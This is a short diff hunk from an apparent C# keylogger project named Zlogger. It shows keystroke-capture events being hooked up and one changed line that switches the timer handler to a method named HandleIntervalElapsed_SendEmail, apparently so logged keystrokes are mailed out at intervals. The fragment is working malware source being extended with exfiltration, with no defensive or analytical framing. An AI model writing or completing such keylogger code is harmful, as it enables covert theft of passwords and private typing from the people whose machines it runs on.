@@ -20,7 +20,7 @@ namespace Rodjenihm.Zlogger
             {
                 keylogger.KeyDown += KeyloggerEventHandler.HandleKeyDown;
                 keylogger.KeyUp += KeyloggerEventHandler.HandleKeyUp;
-                keylogger.IntervalElapsed += KeyloggerEventHandler.HandleIntervalElapsed;
+                keylogger.IntervalElapsed += KeyloggerEventHandler.HandleIntervalElapsed_SendEmail;
                 keylogger.Run();
                 Application.Run();
             }
